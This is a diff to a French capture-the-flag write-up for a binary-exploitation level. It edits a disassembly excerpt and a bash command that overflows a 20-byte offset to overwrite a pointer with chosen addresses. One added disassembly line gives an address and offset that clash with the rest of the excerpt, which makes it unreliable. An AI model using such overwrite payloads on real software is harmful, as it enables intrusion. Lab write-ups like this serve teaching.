@@ -10,10 +10,10 @@ On decide donc de chopper l'offset et on obtient effectivement 20.
 On peut voir que la valeur de EAX est modifie.
 Ici EAX est un pointeur vers argv[1] et argv[2].
 
-```
-0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
+```asm
+0x080485a5 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
 0x0804858b <+106>:   add    eax,0x4
- 
+...
 0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
 0x080485a8 <+135>:   add    eax,0x8
 ```
@@ -26,5 +26,5 @@ On a donc un offset de 20 vers EAX qui pointe vers `argv[1]/argv[2]` et on le re
 
 On a donc:
 ```bash
-./level7 $(printf 'A%.0s' {1..20} ; printf '\x28\x99\x04\x08') $(printf '\xf4\x84\x04\x08')
+./level7 $(printf '%020d\x28\x99\x04\x08') $(printf '\xf4\x84\x04\x08')
 ```
